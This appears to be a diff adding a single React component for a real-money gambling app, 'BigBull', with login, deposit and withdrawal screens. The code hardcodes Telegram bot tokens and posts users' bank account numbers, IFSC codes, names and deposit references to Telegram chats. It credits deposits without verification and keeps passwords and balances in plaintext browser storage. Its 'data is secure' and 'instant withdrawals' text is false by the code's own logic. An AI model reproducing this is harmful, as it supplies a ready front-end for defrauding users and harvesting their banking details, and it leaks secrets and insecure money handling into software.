@@ -1,0 +1,777 @@
+"use client"
+
+import { useState, useEffect } from "react"
+import { Home, User, Headset, ArrowLeft, LogOut, Plus, Minus } from "lucide-react"
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { Card, CardContent } from "@/components/ui/card"
+import { Tabs, TabsContent } from "@/components/ui/tabs"
+
+export default function BigBullApp() {
+  // State management
+  const [currentView, setCurrentView] = useState<string>("login")
+  const [activeTab, setActiveTab] = useState<string>("home")
+  const [currentUser, setCurrentUser] = useState<any>(null)
+  const [loading, setLoading] = useState<boolean>(false)
+  const [loadingText, setLoadingText] = useState<string>("Loading...")
+  const [alert, setAlert] = useState<{ show: boolean; title: string; message: string }>({
+    show: false,
+    title: "",
+    message: "",
+  })
+  const [depositAmount, setDepositAmount] = useState<number>(0)
+  const [depositUtr, setDepositUtr] = useState<string>("")
+  const [withdrawData, setWithdrawData] = useState({
+    name: "",
+    account: "",
+    ifsc: "",
+    amount: "",
+  })
+  const [withdrawHistory, setWithdrawHistory] = useState<any[]>([])
+  const [showWelcome, setShowWelcome] = useState<boolean>(true)
+  const [gameLoading, setGameLoading] = useState<{ show: boolean; text: string; progress: number; url: string }>({
+    show: false,
+    text: "",
+    progress: 0,
+    url: "",
+  })
+  const [loginData, setLoginData] = useState({
+    mobile: "",
+    password: "",
+  })
+  const [registerData, setRegisterData] = useState({
+    mobile: "",
+    password: "",
+    referralCode: "",
+  })
+
+  // Constants
+  const WALLET_KEY = "bigBullGlobalWallet"
+  const REG_BOT_API = "8089873363:AAE9UmxF93CLZEVFuAEgqu08X3Goj8ARFZg"
+  const REG_CHAT_ID = "6889555911"
+  const WITHDRAW_BOT_API = "7799495376:AAG-qEQ_10oeHBLJ8nxMxXCf0dyf5y6Sdr8"
+  const WITHDRAW_CHAT_ID = "-1002550626684"
+  const DEPOSIT_BOT_API = "8082439279:AAEJlvX8zdUdQzuvCHOjqtZ5RtA-nr67aFE"
+  const DEPOSIT_CHAT_ID = "6889555911"
+
+  // Initialize app
+  useEffect(() => {
+    // Show welcome screen first
+    setTimeout(() => {
+      setShowWelcome(false)
+      checkLoginStatus()
+    }, 2000)
+
+    // Set up real-time balance update listener
+    window.addEventListener("storage", (e) => {
+      if (e.key === WALLET_KEY && currentUser) {
+        updateBalanceDisplay()
+      }
+    })
+
+    return () => {
+      window.removeEventListener("storage", (e) => {})
+    }
+  }, [])
+
+  // Check if user is already logged in
+  const checkLoginStatus = () => {
+    const loggedInUser = localStorage.getItem("bigBullLoggedInUser")
+    if (loggedInUser) {
+      const user = JSON.parse(loggedInUser)
+      setCurrentUser(user)
+      setCurrentView("main")
+      loadWithdrawHistory(user)
+    } else {
+      setCurrentView("login")
+    }
+  }
+
+  // Update balance display
+  const updateBalanceDisplay = () => {
+    if (!currentUser) return
+
+    // Get balance from global wallet
+    const globalBalance = Number.parseFloat(localStorage.getItem(WALLET_KEY) || "0") || currentUser.balance
+    setCurrentUser({ ...currentUser, balance: globalBalance })
+  }
+
+  // Save user data
+  const saveUserData = () => {
+    if (!currentUser) return
+    const userData = JSON.parse(localStorage.getItem(`bigBullUser_${currentUser.mobile}`) || "{}")
+
+    // Get balance from global wallet
+    const globalBalance = Number.parseFloat(localStorage.getItem(WALLET_KEY) || "0") || currentUser.balance
+
+    userData.balance = globalBalance
+    localStorage.setItem(`bigBullUser_${currentUser.mobile}`, JSON.stringify(userData))
+    localStorage.setItem("bigBullLoggedInUser", JSON.stringify({ ...currentUser, balance: globalBalance }))
+  }
+
+  // Load withdraw history
+  const loadWithdrawHistory = (user: any) => {
+    if (!user) return
+    const history = JSON.parse(localStorage.getItem(`withdrawHistory_${user.mobile}`) || "[]")
+    setWithdrawHistory(history)
+  }
+
+  // Show custom alert
+  const showCustomAlert = (title: string, message: string) => {
+    setAlert({
+      show: true,
+      title,
+      message,
+    })
+  }
+
+  // Show loading
+  const showLoading = (text: string) => {
+    setLoadingText(text)
+    setLoading(true)
+  }
+
+  // Hide loading
+  const hideLoading = () => {
+    setLoading(false)
+  }
+
+  // Show game loading
+  const showGameLoading = (text: string, url: string) => {
+    setGameLoading({
+      show: true,
+      text,
+      progress: 0,
+      url,
+    })
+
+    // Animate loading bar
+    setTimeout(() => {
+      setGameLoading((prev) => ({ ...prev, progress: 30 }))
+    }, 300)
+    setTimeout(() => {
+      setGameLoading((prev) => ({ ...prev, progress: 60 }))
+    }, 600)
+    setTimeout(() => {
+      setGameLoading((prev) => ({ ...prev, progress: 90 }))
+    }, 900)
+
+    setTimeout(() => {
+      setGameLoading((prev) => ({ ...prev, progress: 100 }))
+      setTimeout(() => {
+        window.location.href = url
+      }, 300)
+    }, 1200)
+  }
+
+  // Handle login
+  const handleLogin = () => {
+    const { mobile, password } = loginData
+    if (mobile.length !== 10 || !/^\d+$/.test(mobile)) {
+      showCustomAlert("Error", "Please enter a valid 10-digit mobile number.")
+      return
+    }
+    showLoading("Logging in...")
+    setTimeout(() => {
+      const userData = localStorage.getItem(`bigBullUser_${mobile}`)
+      if (userData) {
+        const user = JSON.parse(userData)
+        if (user.password === password) {
+          const currentUserData = { mobile: mobile, id: user.id, balance: user.balance }
+          setCurrentUser(currentUserData)
+          localStorage.setItem("bigBullLoggedInUser", JSON.stringify(currentUserData))
+
+          // Set global wallet
+          localStorage.setItem(WALLET_KEY, user.balance.toFixed(2))
+
+          loadWithdrawHistory(currentUserData)
+          setCurrentView("main")
+          hideLoading()
+        } else {
+          hideLoading()
+          showCustomAlert("Error", "Incorrect password.")
+        }
+      } else {
+        hideLoading()
+        showCustomAlert("Error", "User not found. Please register.")
+      }
+    }, 1000)
+  }
+
+  // Handle register
+  const handleRegister = () => {
+    const { mobile, password, referralCode } = registerData
+    if (mobile.length !== 10 || !/^\d+$/.test(mobile)) {
+      showCustomAlert("Error", "Please enter a valid 10-digit mobile number.")
+      return
+    }
+    if (password.length < 6) {
+      showCustomAlert("Error", "Password must be at least 6 characters.")
+      return
+    }
+    showLoading("Registering...")
+    setTimeout(() => {
+      const existingUser = localStorage.getItem(`bigBullUser_${mobile}`)
+      if (existingUser) {
+        hideLoading()
+        showCustomAlert("Error", "This mobile number is already registered.")
+      } else {
+        const userId = "USER" + Math.floor(10000 + Math.random() * 90000)
+        const newUser = {
+          mobile: mobile,
+          id: userId,
+          password: password,
+          balance: 20,
+          referralCode: referralCode || "",
+          amountGame: 0,
+        }
+        localStorage.setItem(`bigBullUser_${mobile}`, JSON.stringify(newUser))
+        const currentUserData = { mobile: mobile, id: userId, balance: 20 }
+        setCurrentUser(currentUserData)
+        localStorage.setItem("bigBullLoggedInUser", JSON.stringify(currentUserData))
+
+        // Set global wallet
+        localStorage.setItem(WALLET_KEY, "20.00")
+
+        sendToTelegram(
+          REG_BOT_API,
+          REG_CHAT_ID,
+          `New Registration\nID: ${userId}\nMobile: ${mobile}\nReferral: ${referralCode || "None"}\nDate: ${new Date().toLocaleString()}`,
+        )
+        hideLoading()
+        showCustomAlert("Success", "Registration successful! You can now log in.")
+        setCurrentView("main")
+      }
+    }, 1000)
+  }
+
+  // Handle deposit
+  const handleDeposit = () => {
+    if (depositUtr.length < 12) {
+      showCustomAlert("Error", "Please enter a valid UTR (12+ digits).")
+      return
+    }
+    showLoading("Verifying UTR...")
+    setTimeout(() => {
+      const newBalance = currentUser.balance + depositAmount
+      setCurrentUser({ ...currentUser, balance: newBalance })
+
+      // Update global wallet
+      localStorage.setItem(WALLET_KEY, newBalance.toFixed(2))
+
+      saveUserData()
+      sendToTelegram(
+        DEPOSIT_BOT_API,
+        DEPOSIT_CHAT_ID,
+        `Deposit\nUser: ${currentUser.id}\nAmount: ₹${depositAmount}\nUTR: ${depositUtr}\nDate: ${new Date().toLocaleString()}`,
+      )
+      hideLoading()
+      showCustomAlert("Success", "Deposit successful!")
+      setCurrentView("main")
+    }, 2000)
+  }
+
+  // Handle withdraw
+  const handleWithdraw = () => {
+    const { name, account, ifsc, amount } = withdrawData
+    if (!name || !account || !ifsc || !amount) {
+      showCustomAlert("Error", "Please fill all fields.")
+      return
+    }
+
+    const amountValue = Number.parseFloat(amount)
+    if (amountValue < 130) {
+      showCustomAlert("Error", "Minimum withdrawal amount is ₹130.")
+      return
+    }
+    if (amountValue > currentUser.balance) {
+      showCustomAlert("Error", "Insufficient balance.")
+      return
+    }
+
+    showLoading("Processing withdrawal...")
+    const withdrawId = "WID" + Math.floor(10000 + Math.random() * 90000)
+    const timestamp = new Date().toLocaleString()
+
+    sendToTelegram(
+      WITHDRAW_BOT_API,
+      WITHDRAW_CHAT_ID,
+      `Withdraw Request\nID: ${withdrawId}\nUser: ${currentUser.id}\nName: ${name}\nAccount: ${account}\nIFSC: ${ifsc}\nAmount: ₹${amountValue}\nDate: ${timestamp}`,
+    )
+
+    const newBalance = currentUser.balance - amountValue
+    setCurrentUser({ ...currentUser, balance: newBalance })
+
+    // Update global wallet
+    localStorage.setItem(WALLET_KEY, newBalance.toFixed(2))
+
+    saveUserData()
+
+    // Save withdraw history
+    const history = [...withdrawHistory, { id: withdrawId, amount: amountValue, timestamp, status: "Pending" }]
+    setWithdrawHistory(history)
+    localStorage.setItem(`withdrawHistory_${currentUser.mobile}`, JSON.stringify(history))
+
+    setTimeout(() => {
+      hideLoading()
+      showCustomAlert("Success", "Withdrawal request submitted!")
+      setCurrentView("main")
+    }, 2000)
+  }
+
+  // Handle logout
+  const handleLogout = () => {
+    saveUserData()
+    localStorage.removeItem("bigBullLoggedInUser")
+    setCurrentUser(null)
+    showLoading("Logging out...")
+    setTimeout(() => {
+      hideLoading()
+      setCurrentView("login")
+    }, 1000)
+  }
+
+  // Send to Telegram
+  const sendToTelegram = (botApi: string, chatId: string, message: string) => {
+    const url = `https://api.telegram.org/bot${botApi}/sendMessage`
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: message }),
+    }).catch((error) => console.error("Telegram API error:", error))
+  }
+
+  return (
+    <div className="app-container max-w-md mx-auto h-screen bg-gray-100 relative overflow-y-auto">
+      {/* Header */}
+      <header className="sticky top-0 z-50 flex justify-between items-center px-5 h-16 bg-gradient-to-r from-red-500 to-red-400 text-white shadow-lg">
+        <div className="text-2xl font-bold bg-gradient-to-r from-yellow-300 to-red-500 bg-clip-text text-transparent drop-shadow-md">
+          BIGBULL
+        </div>
+        <div className="text-2xl cursor-pointer">
+          <Headset />
+        </div>
+      </header>
+
+      {/* Login View */}
+      {currentView === "login" && (
+        <div className="flex flex-col items-center justify-center h-[calc(100vh-4rem)] p-5">
+          <Card className="w-full bg-gradient-to-r from-orange-500 to-orange-300 shadow-xl">
+            <CardContent className="p-6">
+              <h2 className="text-2xl font-bold mb-6 text-center bg-gradient-to-r from-white to-yellow-300 bg-clip-text text-transparent drop-shadow-md">
+                BIGBULL
+              </h2>
+              <Input
+                type="text"
+                placeholder="Mobile Number"
+                maxLength={10}
+                className="mb-4 bg-white/90"
+                value={loginData.mobile}
+                onChange={(e) => setLoginData({ ...loginData, mobile: e.target.value })}
+              />
+              <Input
+                type="password"
+                placeholder="Password"
+                className="mb-4 bg-white/90"
+                value={loginData.password}
+                onChange={(e) => setLoginData({ ...loginData, password: e.target.value })}
+              />
+              <Button
+                className="w-full bg-gradient-to-r from-red-500 to-red-400 hover:from-red-400 hover:to-red-300 transition-all duration-300 transform hover:-translate-y-1"
+                onClick={handleLogin}
+              >
+                Login
+              </Button>
+              <div className="mt-4 text-center text-white">
+                Don't have an account?{" "}
+                <span
+                  className="text-yellow-300 font-bold cursor-pointer underline"
+                  onClick={() => setCurrentView("register")}
+                >
+                  Register
+                </span>
+              </div>
+            </CardContent>
+          </Card>
+        </div>
+      )}
+
+      {/* Register View */}
+      {currentView === "register" && (
+        <div className="flex flex-col items-center justify-center h-[calc(100vh-4rem)] p-5">
+          <Card className="w-full bg-gradient-to-r from-green-500 to-green-300 shadow-xl">
+            <CardContent className="p-6">
+              <h2 className="text-2xl font-bold mb-6 text-center bg-gradient-to-r from-white to-yellow-300 bg-clip-text text-transparent drop-shadow-md">
+                BIGBULL
+              </h2>
+              <Input
+                type="text"
+                placeholder="Mobile Number"
+                maxLength={10}
+                className="mb-4 bg-white/90"
+                value={registerData.mobile}
+                onChange={(e) => setRegisterData({ ...registerData, mobile: e.target.value })}
+              />
+              <Input
+                type="password"
+                placeholder="Password"
+                className="mb-4 bg-white/90"
+                value={registerData.password}
+                onChange={(e) => setRegisterData({ ...registerData, password: e.target.value })}
+              />
+              <Input
+                type="text"
+                placeholder="Referral Code (Optional)"
+                className="mb-4 bg-white/90"
+                value={registerData.referralCode}
+                onChange={(e) => setRegisterData({ ...registerData, referralCode: e.target.value })}
+              />
+              <Button
+                className="w-full bg-gradient-to-r from-green-600 to-green-500 hover:from-green-500 hover:to-green-400 transition-all duration-300 transform hover:-translate-y-1"
+                onClick={handleRegister}
+              >
+                Register
+              </Button>
+              <div className="mt-4 text-center text-white">
+                Already have an account?{" "}
+                <span
+                  className="text-yellow-300 font-bold cursor-pointer underline"
+                  onClick={() => setCurrentView("login")}
+                >
+                  Login
+                </span>
+              </div>
+            </CardContent>
+          </Card>
+        </div>
+      )}
+
+      {/* Main Content */}
+      {currentView === "main" && (
+        <div className="pb-16">
+          {/* Balance Display */}
+          <div className="p-4 bg-white shadow-md flex justify-between items-center">
+            <div className="font-bold text-lg">Balance: ₹{currentUser?.balance.toFixed(2)}</div>
+            <div className="flex gap-3">
+              <Button size="sm" className="bg-green-500 hover:bg-green-600" onClick={() => setCurrentView("deposit")}>
+                Deposit
+              </Button>
+              <Button
+                size="sm"
+                className="bg-orange-500 hover:bg-orange-600"
+                onClick={() => setCurrentView("withdraw")}
+              >
+                Withdraw
+              </Button>
+            </div>
+          </div>
+
+          {/* Tabs Content */}
+          <Tabs defaultValue="home" value={activeTab} onValueChange={setActiveTab} className="w-full">
+            <TabsContent value="home" className="m-0">
+              <div className="grid grid-cols-2 gap-5 p-5">
+                <Card
+                  className="overflow-hidden shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group relative"
+                  onClick={() => showGameLoading("Opening WinGo Game...", "wingo.html")}
+                >
+                  <div className="absolute inset-0 opacity-0 group-hover:opacity-100 bg-gradient-to-r from-red-500 via-yellow-500 to-green-500 rounded-lg -z-10 transition-opacity duration-500"></div>
+                  <img src="/placeholder.svg?height=120&width=200" alt="WinGo" className="w-full h-24 object-cover" />
+                  <div className="p-3 text-center font-bold bg-red-500 text-white">Win Go</div>
+                </Card>
+
+                <Card
+                  className="overflow-hidden shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group relative"
+                  onClick={() => showGameLoading("Opening Aviator Game...", "aviator.html")}
+                >
+                  <div className="absolute inset-0 opacity-0 group-hover:opacity-100 bg-gradient-to-r from-red-500 via-yellow-500 to-green-500 rounded-lg -z-10 transition-opacity duration-500"></div>
+                  <img src="/placeholder.svg?height=120&width=200" alt="Aviator" className="w-full h-24 object-cover" />
+                  <div className="p-3 text-center font-bold bg-red-500 text-white">Aviator</div>
+                </Card>
+
+                <Card
+                  className="overflow-hidden shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group relative"
+                  onClick={() => showCustomAlert("Info", "Mines coming soon!")}
+                >
+                  <div className="absolute inset-0 opacity-0 group-hover:opacity-100 bg-gradient-to-r from-red-500 via-yellow-500 to-green-500 rounded-lg -z-10 transition-opacity duration-500"></div>
+                  <img src="/placeholder.svg?height=120&width=200" alt="Mines" className="w-full h-24 object-cover" />
+                  <div className="p-3 text-center font-bold bg-red-500 text-white">Mines</div>
+                </Card>
+
+                <Card
+                  className="overflow-hidden shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1 cursor-pointer group relative"
+                  onClick={() => showCustomAlert("Info", "Plinko coming soon!")}
+                >
+                  <div className="absolute inset-0 opacity-0 group-hover:opacity-100 bg-gradient-to-r from-red-500 via-yellow-500 to-green-500 rounded-lg -z-10 transition-opacity duration-500"></div>
+                  <img src="/placeholder.svg?height=120&width=200" alt="Plinko" className="w-full h-24 object-cover" />
+                  <div className="p-3 text-center font-bold bg-red-500 text-white">Plinko</div>
+                </Card>
+              </div>
+            </TabsContent>
+
+            <TabsContent value="profile" className="m-0 p-5">
+              <Card className="shadow-lg">
+                <CardContent className="p-0">
+                  <div className="bg-gradient-to-r from-red-500 to-red-400 p-5 text-white text-center rounded-t-lg">
+                    <div className="w-24 h-24 rounded-full bg-white mx-auto mb-3 border-4 border-white/90 shadow-md overflow-hidden">
+                      <img
+                        src="/placeholder.svg?height=100&width=100"
+                        alt="Profile"
+                        className="w-full h-full object-cover"
+                      />
+                    </div>
+                    <div className="text-xl font-bold tracking-wide">{currentUser?.id}</div>
+                  </div>
+
+                  <div className="p-5 bg-white rounded-b-lg -mt-3">
+                    <div className="text-center mb-6 p-5 bg-gray-50 rounded-lg shadow-inner">
+                      <div className="text-2xl font-bold text-red-500">Balance: ₹{currentUser?.balance.toFixed(2)}</div>
+                    </div>
+
+                    <div className="grid grid-cols-2 gap-3 mb-6">
+                      <Button
+                        className="bg-green-500 hover:bg-green-600 transition-all duration-300 transform hover:-translate-y-1"
+                        onClick={() => setCurrentView("deposit")}
+                      >
+                        <Plus className="mr-2 h-4 w-4" /> Deposit
+                      </Button>
+                      <Button
+                        className="bg-orange-500 hover:bg-orange-600 transition-all duration-300 transform hover:-translate-y-1"
+                        onClick={() => setCurrentView("withdraw")}
+                      >
+                        <Minus className="mr-2 h-4 w-4" /> Withdraw
+                      </Button>
+                    </div>
+
+                    <div className="mb-6 p-4 bg-gray-50 rounded-lg">
+                      <h3 className="text-lg font-bold text-red-500 mb-2">About BigBull Games</h3>
+                      <p className="text-sm text-gray-600 leading-relaxed">
+                        {
+                          ">>>Enjoy thrilling games like Aviator, WinGo, Mines, and Plinko with fair gameplay & instant withdrawals. [Caution]>>>Gambling involves risk--play responsibly we and our agents are not responsible on your r and losses (18+). [Privacy Policy]>>>Your data is secure; we only use it for account management and never share it unlawfully. Play wisely and win big!"
+                        }
+                      </p>
+                    </div>
+
+                    <Button
+                      className="w-full bg-gradient-to-r from-red-500 to-red-400 hover:from-red-400 hover:to-red-300 transition-all duration-300 transform hover:-translate-y-1"
+                      onClick={handleLogout}
+                    >
+                      <LogOut className="mr-2 h-4 w-4" /> Logout
+                    </Button>
+                  </div>
+                </CardContent>
+              </Card>
+            </TabsContent>
+          </Tabs>
+
+          {/* Bottom Navigation */}
+          <div className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-white border-t border-gray-200 shadow-lg flex h-16 z-50">
+            <div
+              className={`flex-1 flex flex-col items-center justify-center cursor-pointer ${activeTab === "home" ? "text-red-500" : "text-gray-500"}`}
+              onClick={() => setActiveTab("home")}
+            >
+              <Home className="h-6 w-6 mb-1" />
+              <div className="text-xs">Home</div>
+            </div>
+            <div
+              className={`flex-1 flex flex-col items-center justify-center cursor-pointer ${activeTab === "profile" ? "text-red-500" : "text-gray-500"}`}
+              onClick={() => setActiveTab("profile")}
+            >
+              <User className="h-6 w-6 mb-1" />
+              <div className="text-xs">Profile</div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Deposit View */}
+      {currentView === "deposit" && (
+        <div className="flex flex-col items-center p-5 h-[calc(100vh-4rem)]">
+          <Card className="w-full bg-gradient-to-r from-blue-500 to-blue-300 shadow-xl">
+            <CardContent className="p-6">
+              <div className="flex items-center mb-6">
+                <Button variant="ghost" size="icon" className="text-white mr-2" onClick={() => setCurrentView("main")}>
+                  <ArrowLeft />
+                </Button>
+                <h2 className="text-2xl font-bold text-center flex-1 bg-gradient-to-r from-white to-yellow-300 bg-clip-text text-transparent drop-shadow-md">
+                  Deposit Funds
+                </h2>
+              </div>
+
+              {!depositAmount ? (
+                <div className="grid grid-cols-3 gap-3 mb-6">
+                  {[120, 200, 300, 400, 500, 800].map((amount) => (
+                    <Button
+                      key={amount}
+                      className="bg-red-500 hover:bg-red-600 transition-all duration-300 transform hover:-translate-y-1 p-5 text-lg"
+                      onClick={() => setDepositAmount(amount)}
+                    >
+                      ₹{amount}
+                    </Button>
+                  ))}
+                </div>
+              ) : (
+                <div className="text-center mb-6">
+                  <div className="bg-white rounded-lg p-4 mb-4 shadow-inner">
+                    <img
+                      src="/placeholder.svg?height=300&width=300"
+                      alt="QR Code"
+                      className="w-full max-w-xs mx-auto mb-4"
+                    />
+                    <div className="text-xl font-bold text-gray-800">Amount: ₹{depositAmount}</div>
+                  </div>
+                  <Input
+                    type="text"
+                    placeholder="Enter UTR (12+ digits)"
+                    className="mb-4 bg-white/90"
+                    value={depositUtr}
+                    onChange={(e) => setDepositUtr(e.target.value)}
+                  />
+                  <Button
+                    className="w-full bg-gradient-to-r from-red-500 to-red-400 hover:from-red-400 hover:to-red-300 transition-all duration-300 transform hover:-translate-y-1"
+                    onClick={handleDeposit}
+                  >
+                    Submit
+                  </Button>
+                </div>
+              )}
+
+              <Button
+                className="w-full bg-white/20 hover:bg-white/30 text-white"
+                onClick={() => {
+                  setDepositAmount(0)
+                  setCurrentView("main")
+                }}
+              >
+                Back
+              </Button>
+            </CardContent>
+          </Card>
+        </div>
+      )}
+
+      {/* Withdraw View */}
+      {currentView === "withdraw" && (
+        <div className="flex flex-col items-center p-5 h-[calc(100vh-4rem)]">
+          <Card className="w-full bg-gradient-to-r from-orange-600 to-orange-400 shadow-xl">
+            <CardContent className="p-6">
+              <div className="flex items-center mb-6">
+                <Button variant="ghost" size="icon" className="text-white mr-2" onClick={() => setCurrentView("main")}>
+                  <ArrowLeft />
+                </Button>
+                <h2 className="text-2xl font-bold text-center flex-1 bg-gradient-to-r from-white to-yellow-300 bg-clip-text text-transparent drop-shadow-md">
+                  Withdraw Funds
+                </h2>
+              </div>
+
+              <Input
+                type="text"
+                placeholder="Name"
+                className="mb-4 bg-white/90"
+                value={withdrawData.name}
+                onChange={(e) => setWithdrawData({ ...withdrawData, name: e.target.value })}
+              />
+              <Input
+                type="text"
+                placeholder="Bank Account Number"
+                className="mb-4 bg-white/90"
+                value={withdrawData.account}
+                onChange={(e) => setWithdrawData({ ...withdrawData, account: e.target.value })}
+              />
+              <Input
+                type="text"
+                placeholder="IFSC Code"
+                className="mb-4 bg-white/90"
+                value={withdrawData.ifsc}
+                onChange={(e) => setWithdrawData({ ...withdrawData, ifsc: e.target.value })}
+              />
+              <Input
+                type="number"
+                placeholder="Amount (Min ₹130)"
+                className="mb-4 bg-white/90"
+                value={withdrawData.amount}
+                onChange={(e) => setWithdrawData({ ...withdrawData, amount: e.target.value })}
+              />
+              <Button
+                className="w-full bg-gradient-to-r from-red-500 to-red-400 hover:from-red-400 hover:to-red-300 transition-all duration-300 transform hover:-translate-y-1 mb-4"
+                onClick={handleWithdraw}
+              >
+                Submit
+              </Button>
+
+              {withdrawHistory.length > 0 && (
+                <div className="bg-white/90 rounded-lg p-3 mb-4 max-h-40 overflow-y-auto">
+                  <h3 className="font-bold mb-2 text-gray-800">Withdrawal History</h3>
+                  {withdrawHistory.map((item, index) => (
+                    <div key={index} className="flex justify-between py-2 border-b border-gray-200 text-sm">
+                      <span>{item.id}</span>
+                      <span>₹{item.amount}</span>
+                      <span>{item.status}</span>
+                    </div>
+                  ))}
+                </div>
+              )}
+
+              <Button
+                className="w-full bg-white/20 hover:bg-white/30 text-white"
+                onClick={() => setCurrentView("main")}
+              >
+                Back
+              </Button>
+            </CardContent>
+          </Card>
+        </div>
+      )}
+
+      {/* Welcome Screen */}
+      {showWelcome && (
+        <div className="fixed inset-0 bg-black/90 z-50 flex justify-center items-center">
+          <img
+            src="/placeholder.svg?height=400&width=300"
+            alt="Welcome"
+            className="max-w-[90%] max-h-[80%] rounded-lg animate-fadeIn"
+          />
+        </div>
+      )}
+
+      {/* Game Loading Overlay */}
+      {gameLoading.show && (
+        <div className="fixed inset-0 bg-black/80 z-50 flex flex-col justify-center items-center">
+          <div className="text-white text-xl font-bold mb-5 text-center">{gameLoading.text}</div>
+          <div className="w-4/5 max-w-xs h-5 bg-white/20 rounded-full overflow-hidden">
+            <div
+              className="h-full bg-gradient-to-r from-red-500 to-orange-500 rounded-full transition-all duration-300"
+              style={{ width: `${gameLoading.progress}%` }}
+            ></div>
+          </div>
+        </div>
+      )}
+
+      {/* Loading Overlay */}
+      {loading && (
+        <div className="fixed inset-0 bg-black/70 z-50 flex flex-col justify-center items-center gap-3">
+          <div className="text-white font-bold">{loadingText}</div>
+          <div className="w-48 h-5 bg-gray-300 rounded-full overflow-hidden relative">
+            <div className="absolute h-full w-1/2 bg-red-500 rounded-full animate-loading"></div>
+          </div>
+        </div>
+      )}
+
+      {/* Custom Alert */}
+      {alert.show && (
+        <div className="fixed inset-0 bg-black/50 z-50 flex justify-center items-center">
+          <div className="bg-white rounded-xl p-6 w-[90%] max-w-xs text-center shadow-2xl">
+            <h3 className="text-xl font-bold mb-3 text-red-500">{alert.title}</h3>
+            <p className="mb-5 text-gray-700">{alert.message}</p>
+            <Button
+              className="bg-gradient-to-r from-red-500 to-red-400 hover:from-red-400 hover:to-red-300 transition-all duration-300 transform hover:-translate-y-1"
+              onClick={() => setAlert({ ...alert, show: false })}
+            >
+              OK
+            </Button>
+          </div>
+        </div>
+      )}
+    </div>
+  )
+}
+
